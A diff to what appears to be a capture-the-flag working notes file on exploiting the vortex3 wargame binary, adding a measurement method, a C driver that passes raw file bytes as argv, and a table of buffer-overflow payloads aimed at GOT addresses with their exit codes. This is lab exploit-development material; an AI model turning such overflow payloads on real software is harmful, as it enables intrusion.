@@ -175,3 +175,35 @@ The only facts reproduced consistently today: **132 bytes gives rc=0**,
 produces output. `lpp` must be a value in `0x0804xxxx` to pass the check.
 Everything else in this file should be treated as unverified until
 re-measured.
+
+## Measurement method (2026-11-07, supersedes the above where they conflict)
+
+`/vortex/vortex3 "$(cat file)"` does **not** deliver the file's bytes: the
+shell turns it into a UTF-8 encoded string and the argument changes length
+(148 bytes on disk -> 142 characters, with surrogates). All earlier shell
+`$(cat)` runs are affected.
+
+The reliable measurement is the driver `/tmp/l3w/drv` (source below): it
+reads a file and `execv`s vortex3 with those exact bytes as argv[1].
+Reproduced with it:
+
+| payload | rc |
+|---|---|
+| 128 'A' + `0x0804b200` | 0 |
+| 128 'A' + `0x0804b200` + zeros + `0x0804b200` + 'B'*8 | 0 |
+| 128 'A' + `0x0804b1f0` + zeros | 139 (SIGSEGV) |
+| 131 'A's | 0 |
+| 132, 133 'A's | 139 |
+| 160 'A's | 2 |
+
+No output on any route. So a valid GOT target gives a clean `exit(0)` through
+the real `exit`, and the earlier rc=2 results were the shell mangling the
+argument.
+
+```
+#include <unistd.h>
+#include <stdio.h>
+int main(int c, char **v){ static char buf[4096]; FILE *f=fopen(v[1],"rb");
+ size_t n=fread(buf,1,sizeof buf-1,f); fclose(f); buf[n]=0;
+ char *a[]={"/vortex/vortex3", buf, 0}; execv(a[0],a); return 51; }
+```
